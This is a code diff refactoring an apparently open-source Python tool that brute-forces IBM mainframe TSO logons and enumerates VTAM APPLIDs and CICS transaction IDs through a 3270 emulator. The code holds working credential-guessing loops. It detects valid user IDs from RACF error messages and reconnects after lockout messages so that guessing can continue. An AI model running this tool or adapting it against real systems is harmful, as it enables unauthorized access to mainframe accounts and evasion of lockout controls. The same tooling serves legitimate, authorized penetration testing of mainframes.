@@ -12,12 +12,13 @@
 # The original was GPL'ed and hence so is this
 # Dominic White @singe dominic () sensepost.com
 
-from py3270 import EmulatorBase,CommandError,FieldTruncateError
+from py3270wrapper import WrappedEmulator
 import time
 import sys 
 import argparse
 import re
 import platform
+from IPython import embed
 
 # Print output that can be surpressed by a CLI opt
 def whine(text, kind='clear', level=0):
@@ -35,85 +36,13 @@ def whine(text, kind='clear', level=0):
 		elif level == 3: lvldisp = "\t\t\t"
 		print lvldisp+typdisp+text
 
-# Override some behaviour of py3270 library
-class EmulatorIntermediate(EmulatorBase):
-	def send_enter(self): #Allow a delay to be configured
-		self.exec_command('Enter')
-		if results.sleep > 0:
-			time.sleep(results.sleep)
-
-	def screen_get(self):
-		response = self.exec_command('Ascii()')
-		return response.data
-	
-# Set the emulator intelligently based on your platform
-# Mainframed helpfully provided binaries for you, you can get them from
-# https://github.com/mainframed/TSO-Brute
-# I'm going to assume you've masters "installing things", do so, then update
-# the relevant path below for your OS
-if platform.system() == 'Darwin':
-	class Emulator(EmulatorIntermediate):
-		x3270_executable = '/usr/local/bin/x3270' #'MAC_Binaries/x3270'
-		s3270_executable = '/usr/local/bin/s3270' #'MAC_Binaries/s3270'
-elif platform.system() == 'Linux':
-	class Emulator(EmulatorIntermediate):
-		x3270_executable = '/usr/bin/x3270' #comment this line if you do not wish to use x3270 on Linux
-		s3270_executable = '/usr/bin/s3270'
-elif platform.system() == 'Windows':
-	class Emulator(EmulatorIntermediate):
-		#x3270_executable = 'Windows_Binaries/wc3270.exe'
-		s3270_executable = 'Windows_Binaries/ws3270.exe'
-else:
-	whine('Your Platform:', platform.system(), 'is not supported at this time.',kind='err')
-	sys.exit(1)
-
-# Send text without triggering field protection
-def safe_send(em, text):
-	for i in xrange(0,len(text)):
-		em.send_string(text[i])
-		if em.status.field_protection == 'P':
-			return False #We triggered field protection, stop
-	return True #Safe
-
-def safe_fieldfill(em, ypos, xpos, tosend, length):
-	if length - len(tosend) < 0:
-		raise FieldTruncateError('length limit %d, but got "%s"' % (length, tosend))
-	if xpos is not None and ypos is not None:
-		em.move_to(ypos, xpos)
-	try:
-		em.delete_field()
-		if safe_send(em, tosend):
-			return True #Hah, we win, take that mainframe
-		else:
-			return False #we entered what we could, bailing
-	except CommandError, e:
-		# We hit an error, get mad
-		return False
-		#if str(e) == 'Keyboard locked':
-
-# Search the screen for text when we don't know exactly where it is, checking for read errors
-def find_response(em, response):
-	for rows in xrange(1,int(em.status.row_number)+1):
-		for cols in xrange(1,int(em.status.col_number)+1-len(response)):
-			try:
-				if em.string_found(rows, cols, response):
-					return True
-			except CommandError, e:
-				# We hit a read error, usually because the screen hasn't returned
-				# increasing the delay works
-				time.sleep(results.sleep)
-				results.sleep += 1
-				whine('Read error encountered, assuming host is slow, increasing delay by 1s to: ' + str(results.sleep),kind='warn')
-				return False
-	return False
-
 def check_CICS(em):
 	whine('Checking if in CICS',kind='info')
 	em.delete_field()
 	em.send_string('CESF') #CICS CESF is the Signoff command
 	em.send_enter()
 
-	if find_response(em, 'Sign-off is complete'):
+	if em.find_response( 'Sign-off is complete'):
 		whine('Mainframe is in CICS',kind='good')
 		return True
 	else:
@@ -122,7 +51,7 @@ def check_CICS(em):
 		em.send_string('CESF') #CICS signoff command
 		em.send_enter()
 
-		if find_response(em, 'Sign-off is complete'):
+		if em.find_response( 'Sign-off is complete'):
 			whine('Mainframe is in CICS',kind='good')
 			return True
 		else:
@@ -150,17 +79,21 @@ def check_VTAM(em):
 	#Test command enabled in the session-level USS table ISTINCDT, should always work
 	em.send_string('IBMTEST')
 	em.send_enter()
-	if not find_response(em, 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
-		for i in xrange(1,3):
-			time.sleep(results.sleep+i)
-			if find_response(em, 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
-				results.sleep += 1
-				whine('The host is slow, increasing delay by 1s to: ' + str(results.sleep),kind='warn')
+	time.sleep(results.sleep)
+	if not em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
+		for i in xrange(1,5):
+			time.sleep(results.sleep+(i/10))
+			if em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
+				results.sleep += 0.1
+				whine('The host is slow, increasing delay by 0.1s to: ' + str(results.sleep),kind='warn')
 				return True
+			else:
+				em.send_string('IBMTEST')
+				em.send_enter()
 		whine('Mainframe not in VTAM, aborting',kind='err')
 		check_CICS(em) #All may not be lost
 		return False
-	elif find_response(em, 'REQSESS error'):
+	elif em.find_response( 'REQSESS error'):
 		whine('Mainframe may be in a weird VTAM, continuing reluctantly',kind='warn')
 	else:
 		return True
@@ -177,7 +110,7 @@ def enter_TSOPanel(em):
 	em.send_string('TSOFAKE')
 	em.send_enter() 
 
-	if not find_response(em, 'TSO/E LOGON'):
+	if not em.find_response( 'TSO/E LOGON'):
 		whine('Not at TSO/E Logon screen. Aborting.',kind='err')
 		return False
 	whine('At TSO/E Logon Panel',kind='info',level=1)
@@ -212,23 +145,23 @@ def brute_TSO(em,results,userfile,passfile=''):
 			continue
 		
 		# Enter the username
-		safe_fieldfill(em,06, 20, username.strip(), 7)
+		em.safe_fieldfill(06, 20, username.strip(), 7)
 		em.move_to(1,1)
 		em.send_enter()
 		print em.screen_get()
 		gooduser = False
 
 		# We've tried too many attempts and need to reconnect
-		if find_response(em, 'LOGON REJECTED, TOO MANY ATTEMPTS'):
+		if em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
 			em.reconnect()
 			enter_TSOPanel()
-			safe_fieldfill(em,06, 20, username.strip(), 7)
+			em.safe_fieldfill(06, 20, username.strip(), 7)
 			em.send_enter()
 
 		# Look for output showing the user exists
-		if find_response(em, 'Enter current password for'):
+		if em.find_response( 'Enter current password for'):
 			gooduser = True
-		elif find_response(em, 'LOGON REJECTED, RACF TEMPORARILY REVOKING USER'):
+		elif em.find_response( 'LOGON REJECTED, RACF TEMPORARILY REVOKING USER'):
 			gooduser = True
 		# Allow for additional responses to be defined
 
@@ -249,21 +182,21 @@ def brute_TSO(em,results,userfile,passfile=''):
 					continue
 
 				# Enter the password
-				safe_fieldfill(em,8, 20, password.strip(),8)
+				em.safe_fieldfill(8, 20, password.strip(),8)
 				em.send_enter()
 
 				# We've tried too many attempts and need to reconnect
-				if find_response(em, 'LOGON REJECTED, TOO MANY ATTEMPTS'):
+				if em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
 					em.reconnect()
 					enter_TSOPanel(em)
-					safe_fieldfill(em,06, 20, username.strip(), 7)
-					safe_fieldfill(em,8, 20, password.strip(),8)
+					em.safe_fieldfill(06, 20, username.strip(), 7)
+					em.safe_fieldfill(8, 20, password.strip(),8)
 					em.send_enter()
 
 				# Check the responses
-				if find_response(em, 'PASSWORD NOT AUTHORIZED FOR USERID'):
+				if em.find_response( 'PASSWORD NOT AUTHORIZED FOR USERID'):
 					validpass = False
-				elif find_response(em, 'LOGON REJECTED'):						
+				elif em.find_response( 'LOGON REJECTED'):						
 					validpass = False
 				# todo: add code to deal with a locked out account
 
@@ -311,9 +244,9 @@ def brute_APPLID(em,results,appfile):
 		if cmdtype == 'APPLID' and validate_text(applid,8,cmdtype):
 			if noapplid: #LOGON launches TSO, so skips APPLID checks
 				break
-			safe_send(em,'LOGON APPLID('+applid.strip()+')')
+			em.safe_send('LOGON APPLID('+applid.strip()+')')
 		elif cmdtype == "MACRO":
-			safe_send(em,applid.strip())
+			em.safe_send(applid.strip())
 		elif cmdtype == "PF":
 			em.exec_command(applid.strip())
 		screenshot_before = em.screen_get()
@@ -326,35 +259,35 @@ def brute_APPLID(em,results,appfile):
 
 		badcmd = False
 		if em.is_connected():
-			if find_response(em, 'COMMAND UNRECOGNIZED'):
+			if em.find_response( 'COMMAND UNRECOGNIZED'):
 				badcmd = True
-			elif find_response(em, 'SESSION NOT BOUND'):
+			elif em.find_response( 'SESSION NOT BOUND'):
 				badcmd = True
-			elif find_response(em, 'INVALID COMMAND'):
+			elif em.find_response( 'INVALID COMMAND'):
 				badcmd = True
-			elif find_response(em, 'PARAMETER OMITTED'):
+			elif em.find_response( 'PARAMETER OMITTED'):
 				badcmd = True
-			elif find_response(em, 'REQUERIDO PARAMETRO PERDIDO'):
+			elif em.find_response( 'REQUERIDO PARAMETRO PERDIDO'):
 				badcmd = True
-			elif find_response(em, 'Your command is unrecognized'):
+			elif em.find_response( 'Your command is unrecognized'):
 				badcmd = True
-			elif find_response(em, 'invalid command or syntax'):
+			elif em.find_response( 'invalid command or syntax'):
 				badcmd = True
-			elif find_response(em, 'UNABLE TO ESTABLISH SESSION'):
+			elif em.find_response( 'UNABLE TO ESTABLISH SESSION'):
 				badcmd = True
-			elif find_response(em, 'UNSUPPORTED FUNCTION'):
+			elif em.find_response( 'UNSUPPORTED FUNCTION'):
 				badcmd = True
-			elif find_response(em, 'REQSESS error'):
+			elif em.find_response( 'REQSESS error'):
 				badcmd = True
-			elif find_response(em, 'syntax invalid'):
+			elif em.find_response( 'syntax invalid'):
 				badcmd = True
-			elif find_response(em, 'INVALID SYSTEM'):
+			elif em.find_response( 'INVALID SYSTEM'):
 				badcmd = True
-			elif find_response(em, 'NOT VALID'):
+			elif em.find_response( 'NOT VALID'):
 				badcmd = True
-			elif find_response(em, 'COMMAND UNRECOGNIZED'):
+			elif em.find_response( 'COMMAND UNRECOGNIZED'):
 				badcmd = True
-			elif find_response(em, 'INVALID USERID, APPLID'):
+			elif em.find_response( 'INVALID USERID, APPLID'):
 				badcmd = False
 				noapplid = True
 				whine('LOGON launches TSO, skipping further APPLIDs',kind='warn',level=1)
@@ -385,7 +318,7 @@ def brute_CICS(em,results,transfile):
 	for transid in transfile:
 		em.delete_field() #Some inputs are dumb, and we need to blank the previous command
 		if validate_text(transid,10,'TRANSID'): #todo, are there length restrictions?
-			safe_send(em,transid.strip())
+			em.safe_send(transid.strip())
 		screenshot_before = em.screen_get()
 		if screenshot_before == screenshot_after:
 			# Check if the screen has been locked and our input is being ignored
@@ -397,15 +330,15 @@ def brute_CICS(em,results,transfile):
 
 		badcmd = False
 		if em.is_connected():
-			if find_response(em, 'is not recognized'):
+			if em.find_response( 'is not recognized'):
 				badcmd = True
-			elif find_response(em, 'sign on or have the right security'):
+			elif em.find_response( 'sign on or have the right security'):
 				badcmd = True
 			elif screenshot_before == screenshot_after:
 				badcmd = True
 				em.reconnect() #We need to close and reconnect to exit the app
 				enter_CICS(em)
-			elif find_response(em, 'Sign-off is complete'):
+			elif em.find_response( 'Sign-off is complete'):
 				badcmd = False
 				em.reconnect()
 				enter_CICS(em)
@@ -483,13 +416,13 @@ whine('Attack platform\t\t: ' + platform.system(),kind='info')
 if results.movie_mode and not platform.system() == 'Windows':
 	whine('ULTRA Hacker Movie Mode\t: Enabled',kind='info')
 	#Enables Movie Mode which uses x3270 so it looks all movie like
-	em = Emulator(visible=True)
+	em = WrappedEmulator(visible=True,delay=results.sleep)
 elif results.movie_mode and platform.system() == 'Windows':
 	whine('ULTRA Hacker Movie Mode not supported on Windows',kind='warn')
-	em = Emulator()
+	em = WrappedEmulator(visible=False,delay=results.sleep)
 else:
 	whine('ULTRA Hacker Movie Mode\t: Disabled',kind='info')
-	em = Emulator()
+	em = WrappedEmulator(visible=False,delay=results.sleep)
 if results.quiet:
 	whine('Quiet Mode Enabled\t: Shhhhhhhhh!',type='warn')
 
